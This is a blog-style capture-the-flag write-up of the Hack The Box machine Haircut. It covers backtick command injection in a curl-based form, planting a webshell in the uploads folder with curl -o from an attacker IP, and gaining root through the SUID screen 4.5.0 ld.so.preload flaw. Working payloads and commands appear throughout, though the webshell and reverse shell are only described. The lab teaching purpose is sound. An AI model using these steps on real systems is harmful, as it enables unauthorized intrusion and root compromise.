---
layout: post
title: "The Errand Boy Carried a Knife"
subtitle: "HTB Haircut, where a web form that runs curl for you will run a little more than that, and an old screen binary finishes the job"
date: 2017-10-07 12:00:00 +0000
description: "A web page that fetches URLs on your behalf gets talked into fetching a backdoor, and a SUID screen binary writes a root shell into existence."
image: /assets/og/the-errand-boy-carried-a-knife.png
tags: [hackthebox, writeup]
---

Haircut is a box about an errand boy. You hand a web form a URL, it runs `curl` to go fetch the thing for you, and that is the whole sanctioned feature. The trouble is that the form pastes your text straight into the command it runs, and `curl` is not a single trick. It is a whole toolbox with a flag for everything, including a flag that means "save this to a file right here." So you stop asking the errand boy to fetch a page and start asking him to fetch a backdoor and drop it in the one folder the web server will happily run. The filter on the door slaps away the obvious knives, the semicolons and the pipes, and never notices the backtick. Then root is just an old copy of `screen` wearing a SUID bit it should never have been given, the kind of binary that will write a file as root because you asked nicely with the wrong flag.

```
        H A I R C U T
        =============
        formurl:  http://you/shell  -o uploads/iceberg.php
                  "fetch this for me"   "...and keep a copy"
                        |
                        v
        the page runs `curl <your words>` and trusts the words.
        curl has a flag for writing files. you supply the words.
                        |
                        v
        a shell lands in /uploads, the one folder php will run.
        then an old screen, SUID root, signs the last form for you.
                                            刃
```

## 0x01 · the front desk

Two ports, and the box is not interested in wasting your afternoon. SSH and a web server, nothing else.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http    nginx 1.10.0 (Ubuntu)
```

That nginx version dates the host to Ubuntu 16.04, which is worth filing away because the privesc at the end depends on what shipped on the box, not on what you bring with you. The web root itself is a single picture of someone getting a haircut. Pretty, useless, a closed door. The interesting rooms are the ones not linked from the front page, so you go knocking.

A `gobuster` run over the site turns up two things that matter.

```
$ gobuster dir -u http://10.10.10.24 -w /usr/share/wordlists/dirb/common.txt -x php
/uploads (Status: 403)
/exposed.php (Status: 200)
```

`/uploads` answers with a 403, which is the polite way of saying "this folder exists and I will not let you list it." Remember that folder. `/exposed.php` is the prize. It is a form with a single text box, and the box asks for a URL.

## 0x02 · an errand boy who reads any address

Type a URL into `exposed.php` and the page goes and fetches it, then shows you the result. Behind the curtain it is doing something almost charmingly naive. It builds a shell command by gluing your text onto the end of the word `curl`, roughly `curl <your text> 2>&1`, and runs the whole sentence. Picture a clerk you can send on errands, and the way you send him is by writing the errand on a slip and he reads the slip out loud to himself and does exactly what it says. If the slip says "go to this website," fine. The clerk never stops to ask whether you wrote one errand on the slip or three.

The reflex move is classic command injection. Tack a second command onto the first with a semicolon or a pipe and watch both run. So you try the obvious.

```
http://example.com; id
http://example.com | id
```

Both bounce. There is a filter on the input, and it is swatting away a specific list of dangerous characters and words before the command ever runs, things like `;`, `|`, `&`, `#`, the curly braces, and names like `bash`, `nc`, `python`, and `perl`. It is a blacklist, which means it is a list of knives someone thought to confiscate, and the entire problem with a list like that is the knife nobody thought of. Here the unguarded knife is the backtick. Backticks are command substitution. The shell runs whatever sits inside them first and pastes the output back into the line. The filter never checks for them.

```
http://10.10.14.4/`id`
```

The clerk reads the slip, sees the backticks, dutifully runs `id` first, and tries to `curl` a URL with your `uid` baked into it. You have command execution. The catch is that the output goes into a `curl` request that fails, so you are running blind, hitting send and seeing nothing useful come back.

## 0x03 · the flag that writes files

Running blind is annoying, so you change tactics. Forget injecting a second command. The errand boy is `curl`, and `curl` already knows how to write files. Its `-o` flag means "save what you fetch to this exact path." So you do not need a side door. You walk in through the front feature and just give it more arguments than it expected.

Point `curl` at a file on your own machine and tell it to save the result into `/uploads`, the folder you found earlier that the server will execute PHP from.

```
$ cat /var/www/iceberg.php
<?php [ one-line webshell: run the cmd request parameter ] ?>

# submitted into the exposed.php form:
http://10.10.14.4/iceberg.php -o uploads/iceberg.php
```

I am describing that PHP file rather than printing it, and that restraint is the lesson, not squeamishness. The real thing is about four words long, and the moment those exact four words touch a disk, any half-awake antivirus quarantines the file as the textbook backdoor it is. That is the funniest possible proof of how loaded a one-line webshell really is. So picture it. A tiny program that takes a `cmd` parameter off the URL and runs it.

The form runs `curl http://10.10.14.4/iceberg.php -o uploads/iceberg.php`, your machine serves the file, and `curl` saves it right where nginx will run it. Now you call it directly.

```
$ curl "http://10.10.10.24/uploads/iceberg.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

There it is, `www-data`. Trade the webshell up for a proper interactive session, [ a bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ], catch it on a listener, and you are standing on the box. The user flag is sitting in maria's home.

```
www-data@haircut:/$ cat /home/maria/Desktop/user.txt
████████████████████████████████
```

## 0x04 · the old razor in the drawer

`www-data` is a tenant, not the landlord. Time to find something that runs as root that should not. The first sweep for any privesc on Linux is the SUID hunt, looking for programs flagged to run with their owner's power instead of yours.

```
www-data@haircut:/$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/screen-4.5.0
...
```

A SUID bit means a program runs as whoever owns it, no matter who launches it. Think of it like a delivery van with the company's master key welded under the seat. The driver is a temp, but the van itself can open every door, so whatever the van is told to do, it does with the company's authority. Most of the SUID list here is the normal furniture, `passwd` and friends. The one that does not belong is `screen-4.5.0`. Somebody installed a specific, named version of `screen` and handed it the master key.

That version is the tell. `screen` 4.5.0 carries CVE-2017-5186, a flaw in how it opens its log file when you use the `-L` logging flag. `screen` runs as root because of the SUID bit, and when it creates that log file it does so with root's authority but without checking whether you should be allowed to write to the path you named. So you point its logging at a file root would never let you touch, and root creates it for you, with your content inside. It is the errand-boy bug all over again, one rung up. A privileged program doing a write on your behalf and never asking whether the destination was any of your business.

## 0x05 · forging a root shell out of a log

The exploit turns that arbitrary root-owned write into a root shell in two short hops. The lever is `/etc/ld.so.preload`, a file Linux reads before running almost any program. Anything listed there gets loaded into every new process first. If you can write to it, you can inject your own code into the next thing root runs.

First you build two tiny pieces and drop them in `/tmp`. One is a small shared library whose constructor, the code that fires automatically the instant the library loads, does three things: it takes a plain shell binary you also dropped, chowns it to root, sets its SUID bit, and then deletes `/etc/ld.so.preload` to clean up after itself. The second piece is that shell binary, a four-line C program that calls `setuid(0)` and execs `/bin/sh`.

```
# built on the box, sitting in /tmp:
#   libhax.so   -> constructor: chown root /tmp/rootshell; chmod 4755; unlink /etc/ld.so.preload
#   rootshell   -> setuid(0); execve("/bin/sh")
```

Now the actual move. You use the SUID `screen` to write the path of your library into `/etc/ld.so.preload`. The `-L` flag names the log file, and root, running `screen`, creates it.

```
www-data@haircut:/$ cd /etc
www-data@haircut:/etc$ umask 000
www-data@haircut:/etc$ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

Root just wrote `/tmp/libhax.so` into the preload file. The next time any program starts, the loader reads that file and pulls your library into the process before anything else. So you start a harmless `screen` command to trigger it.

```
www-data@haircut:/etc$ screen-4.5.0 -ls
```

The loader sees the preload entry, loads `libhax.so`, the constructor fires as root, and it stamps your `rootshell` binary SUID root and wipes the preload file behind it. Now `rootshell` is a SUID-root program of your own making. You run it and the van opens the last door.

```
www-data@haircut:/etc$ /tmp/rootshell
# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
# cat /root/root.txt
████████████████████████████████
```

## 0x06 · the honest caveat

Haircut is two confessions stacked on top of each other, and they are the same confession twice. The first is the web form. Nobody on that team set out to build a remote code execution hole. They built a convenience, a page that fetches a URL for you, and the bug was treating a powerful tool like a dumb pipe. `curl` is not a fetch button. It is a command-line program with dozens of flags, and the instant you let a stranger append text to it, you have handed them every one of those flags, including the one that writes files anywhere the web user can reach. The filter made it worse, not better, because a blacklist is a promise you cannot keep. It guards against the knives you imagined and waves through the one you forgot, which here was a single backtick.

The privesc is the same shape in a uniform. A SUID program is a tiny window where your input gets to act with root's authority, and the only thing standing between that window and disaster is whether the program carefully checks every path and every argument before it acts. Old `screen` did not. It took the filename you handed it and wrote there as root, no questions, and that one missing question is the entire CVE. You cannot patch the human who pasted user input into a shell command, and you cannot blacklist your way to safety. The fix in both halves is the same boring discipline. Decide exactly what the input is allowed to be, and refuse everything else, instead of guessing at the long list of things it is not allowed to be.

## 0x07 · outro

```
the errand boy fetched your page, then your backdoor, because
        a slip of paper cannot tell one errand from three.
the old razor cut a file into existence as root, because
        nobody asked it whether the cut was yours to make.

two doors, both held open by a program acting on words it never read closely.
a blacklist guards the knives you name. the unnamed knife walks in.

allow-list the input. strip the SUID. wear black.

                                                            EOF
```

---

*HTB: Haircut, retired 30 Sep 2017. A medium Linux box that is really a lecture on trusting user input inside a command line, first in a curl form and then in a SUID screen binary. The errand boy still runs whatever the slip says, in a lab and nowhere you don't own.*